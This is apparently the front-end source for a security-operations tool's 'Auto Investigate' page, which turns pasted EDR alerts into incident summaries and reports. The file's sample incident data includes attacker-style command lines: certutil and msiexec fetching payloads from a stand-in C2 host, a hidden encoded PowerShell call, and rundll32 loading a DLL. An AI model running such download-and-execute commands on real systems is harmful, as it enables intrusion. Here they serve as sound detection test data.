/**
 * AutoInvestigatePage — Sprint 1 MVP flagship page.
 *
 * Analyst pastes a full incident from any source (CrowdStrike, Defender,
 * SentinelOne, Splunk, Sysmon …), presses AUTO INVESTIGATE, and gets a
 * structured FINAL INCIDENT SUMMARY back — no prompt engineering, no
 * per-command decoding step.
 *
 * All heavy lifting happens in POST /api/v2/auto-investigate (deterministic
 * orchestrator over the existing engine). This component is the shell.
 */
import { useCallback, useState } from "react";
import api, { API_BASE } from "@/lib/api";
import Header from "@/components/Header";

const SEVERITY_TONE = {
  Critical:      { bg: "#450a0a", fg: "#fecaca", border: "#7f1d1d" },
  High:          { bg: "#451a03", fg: "#fed7aa", border: "#7c2d12" },
  Medium:        { bg: "#422006", fg: "#fde68a", border: "#78350f" },
  Low:           { bg: "#083344", fg: "#a5f3fc", border: "#164e63" },
  Informational: { bg: "#052e16", fg: "#bbf7d0", border: "#14532d" },
};

const VERDICT_TONE = {
  malicious:    "text-red-300 border-red-500/40 bg-red-500/10",
  critical:     "text-red-200 border-red-500/60 bg-red-500/15",
  suspicious:   "text-amber-300 border-amber-500/40 bg-amber-500/10",
  needs_review: "text-sky-300 border-sky-500/40 bg-sky-500/10",
  benign:       "text-emerald-300 border-emerald-500/40 bg-emerald-500/10",
  unknown:      "text-slate-300 border-slate-500/40 bg-slate-500/10",
};

const SAMPLE_INCIDENT = `CrowdStrike Falcon Alert · High · Host: FIN-DC-01 · User: backup_EA
Detection time: 2026-07-22T13:04:54Z

Process tree:
  msiexec.exe /i http://malicious-c2.example.com/loader.msi
   └─ powershell.exe -NoP -W Hidden -EncodedCommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA=
   └─ certutil -urlcache -f http://malicious-c2.example.com/loader.exe C:\\Users\\backup_EA\\AppData\\Local\\loader.exe
   └─ cmd.exe /c whoami && net user backup_EA /domain
   └─ rundll32.exe C:\\Windows\\Temp\\evil.dll,DllMain

C2 IP: 192.168.44.101
Domain: malicious-c2.example.com
SHA256: 4a67e9c22b0c5d7f8ab1c3d0e5b8a2f7d6c8e4a1b9d2f0e3c7a8b5d4e6f1a2c9
Registry: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\backup_EA`;

export default function AutoInvestigatePage() {
  const [input, setInput] = useState("");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const [result, setResult] = useState(null);
  const [focus, setFocus] = useState("");
  const [report, setReport] = useState(null);
  const [reportProfile, setReportProfile] = useState("soc_analyst");
  const [reportLoading, setReportLoading] = useState(false);

  const runInvestigation = useCallback(async () => {
    if (!input.trim()) return;
    setLoading(true);
    setError("");
    setResult(null);
    try {
      const r = await api.post("/v2/auto-investigate", {
        incident_text: input, focus: focus || null,
      });
      setResult(r.data);
    } catch (e) {
      setError(e.friendlyMessage || e.response?.data?.detail || String(e.message || e));
    } finally {
      setLoading(false);
    }
  }, [input, focus]);

  const downloadMarkdown = () => {
    if (!result) return;
    const md = renderMarkdown(result);
    const blob = new Blob([md], { type: "text/markdown" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = "nivxray-final-incident-summary.md";
    a.click();
    URL.revokeObjectURL(url);
  };

  const downloadJson = () => {
    if (!result) return;
    const blob = new Blob([JSON.stringify(result, null, 2)], { type: "application/json" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = "nivxray-final-incident-summary.json";
    a.click();
    URL.revokeObjectURL(url);
  };

  const generateEnterpriseReport = useCallback(async () => {
    if (!input.trim()) return;
    setReportLoading(true);
    try {
      const r = await api.post("/v2/report-writer/generate/from-model", {
        investigation: result, profile: reportProfile,
      });
      setReport(r.data.report);
    } catch (e) {
      setError(e.friendlyMessage || e.response?.data?.detail || String(e.message || e));
    } finally {
      setReportLoading(false);
    }
  }, [input, result, reportProfile]);

  const downloadReportMd = () => {
    if (!report) return;
    const md = renderReportMarkdown(report);
    const blob = new Blob([md], { type: "text/markdown" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = `nivxray-enterprise-report-${report.profile}.md`;
    a.click();
    URL.revokeObjectURL(url);
  };

  return (
    <div className="min-h-screen bg-slate-950 text-slate-100">
      <Header />
      <div className="px-6 py-8">
        <div className="max-w-6xl mx-auto space-y-6">
          <header className="flex items-baseline justify-between" data-testid="auto-investigate-header">
            <div>
              <h1 className="text-2xl font-bold tracking-tight">
                <span className="text-cyan-400">⚡</span> AUTO INVESTIGATE
                <span className="text-slate-500 text-lg font-normal ml-2">v1 · Deterministic First</span>
              </h1>
              <p className="text-sm text-slate-400 mt-1">
                Paste an entire incident. NivXRay extracts, decodes, correlates, and produces a Final Incident Summary — no prompt engineering.
              </p>
            </div>
          </header>

          {/* Input card */}
          <section className="border border-slate-700/60 bg-slate-900/40 rounded-xl p-5"
                   data-testid="auto-investigate-input-card">
            <div className="flex items-center justify-between mb-3">
              <h2 className="text-base font-semibold">Incident input</h2>
              <div className="flex items-center gap-2 text-xs">
                <span className="text-slate-500">Sources:</span>
                <span className="text-slate-400">CrowdStrike · Defender · SentinelOne · Splunk · Sysmon · Cisco · Any text</span>
              </div>
            </div>
            <textarea
              className="w-full min-h-[220px] bg-slate-950/60 border border-slate-800 rounded-lg p-3 font-mono text-xs text-slate-100 placeholder:text-slate-600 focus:outline-none focus:ring-1 focus:ring-cyan-500"
              placeholder="Paste the raw incident here — alert JSON, EDR narrative, plain text, Sysmon logs…"
              value={input}
              onChange={(e) => setInput(e.target.value)}
              disabled={loading}
              data-testid="auto-investigate-input"
            />
            <div className="mt-3 flex items-center gap-2 flex-wrap">
              <button
                onClick={runInvestigation}
                disabled={loading || !input.trim()}
                data-testid="auto-investigate-run-btn"
                className="px-4 py-2 text-sm rounded-lg bg-cyan-500/90 hover:bg-cyan-500 disabled:bg-slate-700 disabled:text-slate-500 text-slate-950 font-bold"
              >
                {loading ? "Investigating…" : "⚡ AUTO INVESTIGATE"}
              </button>
              <button
                onClick={() => setInput(SAMPLE_INCIDENT)}
                disabled={loading}
                data-testid="auto-investigate-sample-btn"
                className="px-3 py-2 text-sm rounded-lg border border-slate-700 text-slate-300 hover:bg-slate-800/60"
              >
                Load sample incident
              </button>
              <button
                onClick={() => { setInput(""); setResult(null); setError(""); }}
                disabled={loading}
                data-testid="auto-investigate-clear-btn"
                className="px-3 py-2 text-sm rounded-lg border border-slate-700 text-slate-400 hover:bg-slate-800/60"
              >
                Clear
              </button>
              <div className="flex items-center gap-1.5 text-xs ml-auto">
                <span className="text-slate-500">Focus:</span>
                {["", "persistence", "c2", "credential-access", "powershell"].map(f => (
                  <button key={f || "any"}
                          data-testid={`focus-${f || "any"}`}
                          onClick={() => setFocus(f)}
                          className={`px-2 py-1 rounded-full text-[10px] font-mono border ${
                            focus === f ? "bg-cyan-500/20 border-cyan-500/60 text-cyan-200"
                                        : "border-slate-700 text-slate-400 hover:bg-slate-800/50"
                          }`}>
                    {f || "any"}
                  </button>
                ))}
              </div>
            </div>
            {error && (
              <div className="mt-3 text-sm text-red-400" data-testid="auto-investigate-error">{error}</div>
            )}
          </section>

          {loading && (
            <div className="animate-pulse space-y-3">
              <div className="h-24 bg-slate-800/40 rounded-xl" />
              <div className="h-40 bg-slate-800/40 rounded-xl" />
              <div className="h-32 bg-slate-800/40 rounded-xl" />
            </div>
          )}

          {result && <FinalIncidentSummary result={result} onExportMd={downloadMarkdown} onExportJson={downloadJson} />}

          {/* Enterprise Report Writer trigger */}
          {result && !report && (
            <section className="border border-cyan-500/40 bg-cyan-500/5 rounded-xl p-5"
                     data-testid="report-writer-cta">
              <div className="flex flex-wrap items-center gap-3">
                <div className="flex-1 min-w-[320px]">
                  <div className="text-[10px] tracking-[0.24em] font-bold text-cyan-300 mb-1">
                    ENTERPRISE REPORT WRITER
                  </div>
                  <h3 className="text-lg font-bold text-slate-100">Generate MDR-grade investigation report</h3>
                  <p className="text-xs text-slate-400 mt-1">
                    Transforms this verified investigation into a 17-section customer-ready document. Deterministic — the report writer never re-investigates or infers new facts.
                  </p>
                </div>
                <div className="flex flex-wrap items-center gap-2">
                  <div className="flex items-center rounded-lg border border-slate-700 overflow-hidden" data-testid="report-profile-tabs">
                    {["executive", "customer", "soc_analyst", "technical"].map(p => (
                      <button key={p}
                              data-testid={`report-profile-${p}`}
                              onClick={() => setReportProfile(p)}
                              className={`px-3 py-1.5 text-[11px] font-semibold ${
                                reportProfile === p ? "bg-cyan-500 text-slate-950" : "text-slate-300"
                              }`}>
                        {p.replace("_", " ")}
                      </button>
                    ))}
                  </div>
                  <button onClick={generateEnterpriseReport}
                          data-testid="generate-report-btn"
                          disabled={reportLoading}
                          className="px-4 py-2 text-sm rounded-lg bg-cyan-500/90 hover:bg-cyan-500 disabled:bg-slate-700 text-slate-950 font-bold">
                    {reportLoading ? "Writing…" : "Generate Report"}
                  </button>
                </div>
              </div>
            </section>
          )}

          {report && <EnterpriseReport report={report}
                                       onExportMd={downloadReportMd}
                                       onProfileChange={(p) => { setReportProfile(p); setReport(null); }}
                                       onClose={() => setReport(null)} />}
        </div>
      </div>
    </div>
  );
}

// ─── Enterprise Report renderer (17 sections) ───────────────────
function EnterpriseReport({ report, onExportMd, onClose, onProfileChange }) {
  const s = report.sections || {};
  const ov = s["02_incident_overview"] || {};
  const rc = s["06_root_cause"] || {};
  const fv = s["16_final_verdict"] || {};
  const bi = s["13_business_impact"] || {};
  const ti = s["11_threat_intelligence"] || {};
  const ca = s["14_customer_actions"] || {};
  return (
    <article className="border border-slate-700/70 rounded-xl p-6 space-y-6"
             data-testid="enterprise-report"
             style={{ background: "linear-gradient(180deg, #0b1522 0%, #050c17 100%)" }}>
      {/* Report header */}
      <header className="flex flex-wrap items-start justify-between gap-3 pb-4 border-b border-slate-800">
        <div>
          <div className="text-[10px] tracking-[0.24em] font-bold text-cyan-300">
            NIVXRAY · ENTERPRISE INVESTIGATION REPORT
          </div>
          <h2 className="text-2xl font-bold mt-1" data-testid="report-incident-number">
            {ov.incident_number}
          </h2>
          <div className="text-xs text-slate-400 mt-1 font-mono">
            <span data-testid="report-source">{ov.detection_source}</span> · host <span className="text-slate-200">{ov.hostname}</span> · user <span className="text-slate-200">{ov.username}</span> · OS {ov.operating_system} · {ov.investigation_status}
          </div>
          {report.customer && (
            <div className="mt-1 text-xs text-slate-400">Customer: <span className="text-slate-200">{report.customer}</span></div>
          )}
        </div>
        <div className="flex items-center gap-2">
          <span className="px-3 py-1 rounded-full text-[10px] uppercase tracking-widest font-bold border border-cyan-500/60 text-cyan-200 bg-cyan-500/10">
            Audience · {report.profile}
          </span>
          <button onClick={onExportMd} data-testid="report-export-md"
                  className="px-3 py-1.5 text-xs border border-slate-700 rounded-lg text-slate-200 hover:bg-slate-800/60">
            Download Markdown
          </button>
          <button onClick={onClose} data-testid="report-close"
                  className="px-3 py-1.5 text-xs border border-slate-700 rounded-lg text-slate-400 hover:bg-slate-800/60">
            Close
          </button>
        </div>
      </header>

      {/* Section 1 — Executive Summary */}
      <ReportSection num={1} title="Executive Summary" testid="section-exec">
        <div className="space-y-2 text-sm text-slate-200 leading-relaxed">
          {(s["01_executive_summary"] || []).map((p, i) => (
            <p key={i} dangerouslySetInnerHTML={{ __html: markdownInline(p) }} />
          ))}
        </div>
      </ReportSection>

      {/* Section 3 — Narrative */}
      <ReportSection num={3} title="Investigation Narrative" testid="section-narrative">
        <div className="text-sm text-slate-200 leading-relaxed whitespace-pre-line"
             dangerouslySetInnerHTML={{ __html: markdownInline(s["03_investigation_narrative"] || "") }} />
      </ReportSection>

      {/* Section 4 — Timeline */}
      <ReportSection num={4} title="Detection Timeline" testid="section-timeline">
        <ol className="space-y-2 text-sm">
          {(s["04_detection_timeline"] || []).map((ev, i) => (
            <li key={i} className="border-l-2 border-cyan-500/40 pl-3">
              <div className="font-mono text-xs text-cyan-300">{ev.time}</div>
              <div className="text-slate-200">{ev.event}</div>
              <div className="text-[10px] font-mono text-slate-500 mt-0.5">{ev.evidence_type}</div>
            </li>
          ))}
        </ol>
      </ReportSection>

      {/* Section 5 — Attack Story */}
      <ReportSection num={5} title="Attack Story" testid="section-attack-story">
        <ol className="space-y-1.5 text-sm text-slate-200 list-decimal pl-5">
          {(s["05_attack_story"] || []).map((beat, i) => <li key={i}>{beat}</li>)}
        </ol>
      </ReportSection>

      {/* Section 6 — Root Cause */}
      <ReportSection num={6} title="Root Cause Analysis" testid="section-root-cause">
        <div className="p-4 rounded-lg border border-amber-500/30 bg-amber-500/5">
          <div className="text-sm text-slate-100 font-semibold" data-testid="root-cause-finding">
            {rc.finding}
          </div>
          <TraceRow record={rc} />
        </div>
      </ReportSection>

      {/* Section 7 — Behaviours */}
      <ReportSection num={7} title="Malware Behaviour" testid="section-behaviour">
        <div className="grid md:grid-cols-2 gap-3">
          {Object.entries(s["07_malware_behaviour"] || {}).map(([tactic, techs]) => (
            <div key={tactic} className="border border-slate-800 rounded p-3 bg-slate-950/50">
              <div className="text-[10px] tracking-widest text-slate-500 font-bold mb-2">{tactic.toUpperCase()}</div>
              <ul className="text-xs text-slate-200 space-y-1 font-mono">
                {techs.map((t, i) => <li key={i}>{t}</li>)}
              </ul>
            </div>
          ))}
        </div>
      </ReportSection>

      {/* Section 8 — Findings */}
      <ReportSection num={8} title="Investigation Findings" testid="section-findings">
        <ul className="space-y-2.5">
          {(s["08_findings"] || []).map((f, i) => (
            <li key={i} className="border-l-2 border-cyan-500/40 pl-3">
              <div className="text-sm text-slate-100">{f.finding}</div>
              <TraceRow record={f} />
            </li>
          ))}
        </ul>
      </ReportSection>

      {/* Section 9 — Supporting Evidence */}
      <ReportSection num={9} title="Supporting Evidence" testid="section-evidence">
        <div className="grid md:grid-cols-2 gap-3">
          {Object.entries(s["09_supporting_evidence"] || {}).map(([cat, d]) => (
            <div key={cat} className="border border-slate-800 rounded p-3 bg-slate-950/50">
              <div className="flex items-baseline justify-between mb-1">
                <div className="text-[11px] font-bold text-slate-300 uppercase tracking-widest">{cat}</div>
                <div className="text-[10px] font-mono text-cyan-300">{d.count}</div>
              </div>
              <div className="text-[11px] text-slate-400 mb-2">{d.rationale}</div>
              <ul className="text-[11px] font-mono text-slate-200 break-all space-y-0.5">
                {(d.samples || []).map((x, i) => <li key={i}>{x}</li>)}
              </ul>
            </div>
          ))}
        </div>
      </ReportSection>

      {/* Section 10 — Environmental */}
      {(s["10_environmental"] || []).length > 0 && (
        <ReportSection num={10} title="Environmental Findings" testid="section-environmental">
          <ul className="space-y-2">
            {s["10_environmental"].map((e, i) => (
              <li key={i} className="border-l-2 border-slate-700 pl-3">
                <div className="text-sm text-slate-100">{e.finding}</div>
                <TraceRow record={e} />
              </li>
            ))}
          </ul>
        </ReportSection>
      )}

      {/* Section 11 — Threat Intel */}
      <ReportSection num={11} title="Threat Intelligence" testid="section-ti">
        <div className="grid md:grid-cols-2 gap-3">
          <TIColumn label="Observed" data={ti.observed || {}} />
          <TIColumn label="Correlated" data={ti.correlated || {}} />
        </div>
      </ReportSection>

      {/* Section 12 — Assets */}
      <ReportSection num={12} title="Affected Assets" testid="section-assets">
        <AssetRows assets={s["12_affected_assets"] || {}} />
      </ReportSection>

      {/* Section 13 — Business Impact */}
      <ReportSection num={13} title="Business Impact" testid="section-business">
        <div className="grid grid-cols-2 md:grid-cols-3 gap-3 text-sm">
          {Object.entries(bi).map(([k, v]) => (
            <div key={k} className="border border-slate-800 rounded p-2.5 bg-slate-950/60">
              <div className="text-[10px] text-slate-500 uppercase tracking-wide">{k.replace(/_/g, " ")}</div>
              <div className={`font-bold ${v === "High" ? "text-red-300" : v === "Medium" ? "text-amber-300" : "text-emerald-300"}`}>{v}</div>
            </div>
          ))}
        </div>
      </ReportSection>

      {/* Section 14 — Customer Actions */}
      <ReportSection num={14} title="Customer Actions" testid="section-actions">
        <div className="grid md:grid-cols-3 gap-3">
          {["immediate", "short_term", "long_term"].map(tier => (
            <div key={tier} className="border border-slate-800 rounded p-3 bg-slate-950/50">
              <div className="text-[10px] tracking-widest text-slate-500 font-bold mb-2">
                {tier.replace("_", " ").toUpperCase()}
              </div>
              <ul className="space-y-1.5 text-sm text-slate-200 list-disc pl-4">
                {(ca[tier] || []).map((a, i) => <li key={i}>{a}</li>)}
              </ul>
            </div>
          ))}
        </div>
      </ReportSection>

      {/* Section 15 — Recommendations */}
      <ReportSection num={15} title="Recommendations" testid="section-recs">
        <ol className="space-y-2 text-sm">
          {(s["15_recommendations"] || []).map((r, i) => (
            <li key={i} className="border-l-2 border-cyan-500/40 pl-3">
              <div className="flex items-baseline gap-2">
                <span className={`text-[10px] uppercase tracking-wide px-2 py-0.5 rounded-full border ${
                  r.priority === "critical" ? "border-red-500/60 text-red-300" :
                  r.priority === "high"     ? "border-amber-500/60 text-amber-300" :
                                              "border-sky-500/60 text-sky-300"
                }`}>{r.priority}</span>
                <span className="text-slate-100 font-medium">{r.action}</span>
              </div>
              {r.rationale && <div className="text-xs text-slate-400 mt-1">{r.rationale}</div>}
            </li>
          ))}
        </ol>
      </ReportSection>

      {/* Section 16 — Final verdict */}
      <ReportSection num={16} title="Final Verdict" testid="section-verdict">
        <div className="grid grid-cols-2 md:grid-cols-4 gap-3 text-sm">
          <VerdictCell label="Verdict"    value={fv.verdict} />
          <VerdictCell label="Severity"   value={fv.severity} />
          <VerdictCell label="Containment" value={fv.current_containment} />
          <VerdictCell label="Confidence" value={`${fv.confidence?.score ?? 0}%`} />
        </div>
        <p className="mt-3 text-sm text-slate-300">Remaining risk: <span className="text-slate-100">{fv.remaining_risk}</span></p>
      </ReportSection>

      {/* Meta footer */}
      <footer className="pt-4 border-t border-slate-800 text-[10px] text-slate-500 font-mono">
        Generated {report.generated_at_utc} · {report.meta?.engine} · deterministic · every conclusion is evidence-traceable
      </footer>
    </article>
  );
}

function ReportSection({ num, title, testid, children }) {
  return (
    <section data-testid={testid}>
      <h3 className="text-xs uppercase tracking-widest text-slate-400 font-bold mb-3">
        <span className="text-cyan-400 mr-2">{String(num).padStart(2, "0")}</span>{title}
      </h3>
      {children}
    </section>
  );
}

function TraceRow({ record }) {
  if (!record?.evidence_source) return null;
  return (
    <div className="mt-1 text-[10px] font-mono text-slate-500 flex flex-wrap gap-x-3">
      <span>Source: <span className="text-slate-300">{record.evidence_source}</span></span>
      <span>Type: <span className={record.evidence_type === "Correlated" ? "text-sky-300" : "text-emerald-300"}>{record.evidence_type}</span></span>
      <span>Confidence: <span className="text-slate-300">{record.confidence}</span></span>
    </div>
  );
}

function TIColumn({ label, data }) {
  return (
    <div className="border border-slate-800 rounded p-3 bg-slate-950/60">
      <div className="text-[10px] tracking-widest text-slate-500 font-bold mb-2">{label.toUpperCase()}</div>
      <ul className="text-xs space-y-1">
        {Object.entries(data).map(([k, v]) => (
          <li key={k} className="flex justify-between gap-2">
            <span className="text-slate-400">{k.replace(/_/g, " ")}</span>
            <span className="text-slate-100 font-mono text-right break-all">
              {Array.isArray(v) ? (v.length ? `${v.length} · ${v.slice(0,2).join(", ")}${v.length > 2 ? "…" : ""}` : "—") :
               typeof v === "boolean" ? (v ? "yes" : "no") :
               v == null ? "—" : String(v)}
            </span>
          </li>
        ))}
      </ul>
    </div>
  );
}

function AssetRows({ assets }) {
  const rows = [
    ["Primary host", assets.primary_host],
    ["Additional hosts", (assets.additional_hosts || []).join(", ") || "—"],
    ["Users", (assets.users || []).join(", ") || "—"],
    ["Network destinations", (assets.network_destinations || []).join(", ") || "—"],
    ["Affected files", (assets.affected_files || []).join(", ") || "—"],
    ["Registry locations", (assets.registry_locations || []).join(", ") || "—"],
  ];
  return (
    <ul className="text-xs space-y-1.5">
      {rows.map(([k, v]) => (
        <li key={k} className="flex justify-between gap-3 border-b border-slate-900 pb-1">
          <span className="text-slate-400 font-mono">{k}</span>
          <span className="text-slate-100 font-mono text-right break-all max-w-[70%]">{v}</span>
        </li>
      ))}
    </ul>
  );
}

function VerdictCell({ label, value }) {
  return (
    <div className="border border-slate-800 rounded p-3 bg-slate-950/60 text-center">
      <div className="text-[10px] text-slate-500 uppercase tracking-widest">{label}</div>
      <div className="text-lg font-bold text-slate-100 mt-1">{value || "—"}</div>
    </div>
  );
}

function renderReportMarkdown(report) {
  // Small local markdown export mirrors the backend one; used for
  // faster client-side downloads (backend also exposes /generate/markdown).
  const s = report.sections || {};
  const ov = s["02_incident_overview"] || {};
  const L = [];
  L.push(`# NivXRay Investigation Report · ${ov.incident_number || ""}`);
  L.push("");
  L.push(`**Source:** ${ov.detection_source} · **Host:** ${ov.hostname} · **User:** ${ov.username} · **OS:** ${ov.operating_system} · **Severity:** ${ov.severity}`);
  L.push("");
  L.push("## 1 · Executive Summary");
  (s["01_executive_summary"] || []).forEach(p => { L.push(p); L.push(""); });
  L.push("## 3 · Investigation Narrative");
  L.push(s["03_investigation_narrative"] || "");
  L.push("");
  L.push("## 4 · Detection Timeline");
  (s["04_detection_timeline"] || []).forEach(e => L.push(`- \`${e.time}\` — ${e.event} (${e.evidence_type})`));
  L.push("");
  L.push("## 5 · Attack Story");
  (s["05_attack_story"] || []).forEach((b, i) => L.push(`${i + 1}. ${b}`));
  L.push("");
  L.push("## 6 · Root Cause");
  const rc = s["06_root_cause"] || {};
  L.push(`**${rc.finding}**   _${rc.evidence_source} · ${rc.evidence_type} · ${rc.confidence}_`);
  L.push("");
  L.push("## 8 · Findings");
  (s["08_findings"] || []).forEach(f => L.push(`- ${f.finding}   _${f.evidence_source} · ${f.evidence_type} · ${f.confidence}_`));
  L.push("");
  L.push("## 15 · Recommendations");
  (s["15_recommendations"] || []).forEach(r => L.push(`- **[${r.priority}]** ${r.action} — ${r.rationale}`));
  L.push("");
  const fv = s["16_final_verdict"] || {};
  L.push("## 16 · Final Verdict");
  L.push(`- Verdict: **${fv.verdict}** · Severity: **${fv.severity}** · Containment: **${fv.current_containment}**`);
  L.push(`- Remaining risk: ${fv.remaining_risk}`);
  L.push("");
  L.push(`_Generated ${report.generated_at_utc} · ${report.meta?.engine} · audience: ${report.profile}_`);
  return L.join("\n");
}

// ─── FINAL INCIDENT SUMMARY panel ────────────────────────────────
function FinalIncidentSummary({ result, onExportMd, onExportJson }) {
  const fis = result.final_incident_summary || {};
  const det = result.detected || {};
  const sevTone = SEVERITY_TONE[fis.severity] || SEVERITY_TONE.Low;
  const verdictTone = VERDICT_TONE[fis.verdict] || VERDICT_TONE.unknown;
  return (
    <section className="space-y-5" data-testid="final-incident-summary">
      {/* Verdict + severity + confidence header */}
      <div className="flex flex-wrap items-center gap-3 border border-slate-700/60 bg-slate-900/40 rounded-xl p-4">
        <span className="text-[10px] tracking-[0.24em] font-bold text-slate-500">FINAL INCIDENT SUMMARY</span>
        <span className={`px-3 py-1 rounded-full text-xs font-bold uppercase border ${verdictTone}`}
              data-testid="fis-verdict">{fis.verdict}</span>
        <span className="px-3 py-1 rounded-full text-xs font-bold border"
              data-testid="fis-severity"
              style={{ background: sevTone.bg, color: sevTone.fg, borderColor: sevTone.border }}>
          {fis.severity}
        </span>
        <span className="px-3 py-1 rounded-full text-xs border border-slate-700 text-slate-300"
              data-testid="fis-confidence">
          Confidence {fis.confidence?.score ?? 0}%
        </span>
        <span className="text-xs text-slate-400 truncate max-w-[40ch]" title={fis.classification}
              data-testid="fis-classification">
          · {fis.classification}
        </span>
        <div className="ml-auto flex items-center gap-2">
          <button onClick={onExportMd} data-testid="fis-export-md"
                  className="px-3 py-1.5 text-xs border border-slate-700 rounded-lg text-slate-200 hover:bg-slate-800/60">
            Download · Markdown
          </button>
          <button onClick={onExportJson} data-testid="fis-export-json"
                  className="px-3 py-1.5 text-xs border border-slate-700 rounded-lg text-slate-200 hover:bg-slate-800/60">
            Download · JSON
          </button>
        </div>
      </div>

      <Section title="Executive Summary" testid="fis-executive">
        <div className="space-y-2 text-sm text-slate-200 leading-relaxed">
          {(fis.executive_summary || []).map((p, i) => (
            <p key={i} dangerouslySetInnerHTML={{ __html: markdownInline(p) }} />
          ))}
        </div>
      </Section>

      {/* Detected · commands + entities */}
      <div className="grid md:grid-cols-2 gap-4">
        <Section title="Detected commands" testid="fis-commands">
          {(det.commands || []).length === 0
            ? <Empty text="No command binaries detected in the incident." />
            : <ul className="space-y-2 text-xs font-mono" data-testid="fis-commands-list">
                {det.commands.map((c, i) => (
                  <li key={i} className="border border-slate-800 rounded p-2 bg-slate-950/60">
                    <div className="text-cyan-300 font-bold">{c.binary}</div>
                    <div className="text-slate-300 break-all">{c.command_line}</div>
                  </li>
                ))}
              </ul>}
        </Section>
        <Section title="Extracted entities" testid="fis-entities">
          <EntityGrid entities={det.entities || {}} />
        </Section>
      </div>

      {/* Findings */}
      <Section title="Investigation Findings" testid="fis-findings">
        {(fis.findings || []).length === 0
          ? <Empty text="No per-command findings produced." />
          : <table className="w-full text-sm">
              <thead className="text-slate-400 text-left border-b border-slate-800">
                <tr><th className="py-2">Command</th><th className="py-2">Verdict</th><th className="py-2 text-right">Risk</th><th className="py-2">Why</th></tr>
              </thead>
              <tbody>
                {fis.findings.map((f, i) => (
                  <tr key={i} className="border-b border-slate-900 align-top">
                    <td className="py-2 font-mono text-slate-200 max-w-[24ch] truncate" title={f.command_line}>
                      <span className="text-cyan-300 mr-1">{f.binary}</span>
                      {f.command_line?.slice(f.binary.length).slice(0, 30)}…
                    </td>
                    <td className="py-2">
                      <span className={`px-2 py-0.5 rounded text-[10px] uppercase border ${VERDICT_TONE[f.verdict] || VERDICT_TONE.unknown}`}>
                        {f.verdict}
                      </span>
                    </td>
                    <td className="py-2 text-right font-mono text-slate-300">{f.risk_score ?? "—"}</td>
                    <td className="py-2 text-slate-400 text-xs">{f.why}</td>
                  </tr>
                ))}
              </tbody>
            </table>}
      </Section>

      {/* MITRE + IOC */}
      <div className="grid md:grid-cols-2 gap-4">
        <Section title="MITRE ATT&CK" testid="fis-mitre">
          {(fis.mitre_attack || []).length === 0
            ? <Empty text="No MITRE techniques mapped." />
            : <table className="w-full text-xs">
                <thead className="text-slate-500 text-left border-b border-slate-800">
                  <tr><th className="py-1">ID</th><th className="py-1">Technique</th><th className="py-1">Tactic</th></tr>
                </thead>
                <tbody>
                  {fis.mitre_attack.map(m => (
                    <tr key={m.id} className="border-b border-slate-900">
                      <td className="py-1 font-mono text-cyan-300">
                        <a href={`https://attack.mitre.org/techniques/${m.id.split(".")[0]}/${m.id.includes(".") ? m.id.split(".")[1] + "/" : ""}`}
                           target="_blank" rel="noreferrer" className="hover:underline">{m.id}</a>
                      </td>
                      <td className="py-1 text-slate-200">{m.technique}</td>
                      <td className="py-1 text-slate-400">{m.tactic}</td>
                    </tr>
                  ))}
                </tbody>
              </table>}
        </Section>

        <Section title="IOC Summary" testid="fis-iocs">
          <EntityGrid entities={fis.iocs || {}} />
        </Section>
      </div>

      {/* Recommendations */}
      <Section title="Recommendations" testid="fis-recommendations">
        <ol className="space-y-2 text-sm">
          {(fis.recommendations || []).map((r, i) => (
            <li key={i} className="border-l-2 border-cyan-500/40 pl-3">
              <div className="flex items-baseline gap-2">
                <span className={`text-[10px] uppercase tracking-wide px-2 py-0.5 rounded-full border ${
                  r.priority === "critical" ? "border-red-500/60 text-red-300" :
                  r.priority === "high"     ? "border-amber-500/60 text-amber-300" :
                                              "border-sky-500/60 text-sky-300"
                }`}>{r.priority}</span>
                <span className="text-slate-100 font-medium">{r.action}</span>
              </div>
              {r.rationale && <div className="text-xs text-slate-400 mt-1">{r.rationale}</div>}
            </li>
          ))}
        </ol>
      </Section>

      {/* Evidence counts */}
      <Section title="Evidence counts" testid="fis-evidence-counts">
        <div className="grid grid-cols-3 sm:grid-cols-6 gap-3 text-xs">
          {Object.entries(fis.evidence_counts || {}).map(([k, v]) => (
            <div key={k} className="border border-slate-800 rounded p-2 bg-slate-950/60 text-center">
              <div className="text-[10px] text-slate-500 uppercase tracking-wide">{k}</div>
              <div className="text-lg font-bold text-slate-100 font-mono">{v}</div>
            </div>
          ))}
        </div>
      </Section>

      {/* Investigation Quality Dashboard — deterministic scorecard */}
      {fis.investigation_quality && (
        <QualityDashboard q={fis.investigation_quality} />
      )}
    </section>
  );
}

// ─── Investigation Quality Dashboard ────────────────────────────
function QualityDashboard({ q }) {
  const completeness = q.overall?.investigation_completeness ?? 0;
  const ready        = !!q.overall?.ready_for_analyst_review;
  return (
    <section className="border rounded-xl p-5"
             data-testid="fis-quality"
             style={{
               background: "linear-gradient(135deg, #0a1628 0%, #051020 100%)",
               borderColor: ready ? "rgba(52,211,153,0.35)" : "rgba(245,158,11,0.35)",
             }}>
      <div className="flex items-center justify-between mb-4">
        <div>
          <div className="text-[10px] tracking-[0.24em] font-bold text-slate-400">
            INVESTIGATION QUALITY
          </div>
          <div className="text-lg font-bold mt-1"
               style={{ color: ready ? "#4ADE80" : "#F59E0B" }}
               data-testid="quality-headline">
            Overall Completeness · {completeness}%
          </div>
        </div>
        <div className="text-right">
          <span className={`px-3 py-1 rounded-full text-xs font-bold border ${
            ready ? "text-emerald-300 border-emerald-500/50 bg-emerald-500/10"
                  : "text-amber-300 border-amber-500/50 bg-amber-500/10"
          }`} data-testid="quality-ready">
            {ready ? "READY FOR ANALYST REVIEW" : "REVIEW GAPS BELOW"}
          </span>
        </div>
      </div>

      {/* Completeness bar */}
      <div className="mb-5">
        <div className="h-2 rounded-full overflow-hidden bg-slate-800/60">
          <div className="h-full rounded-full transition-all"
               style={{
                 width: `${completeness}%`,
                 background: ready
                   ? "linear-gradient(90deg,#10B981,#4ADE80)"
                   : "linear-gradient(90deg,#F59E0B,#FCD34D)",
               }} />
        </div>
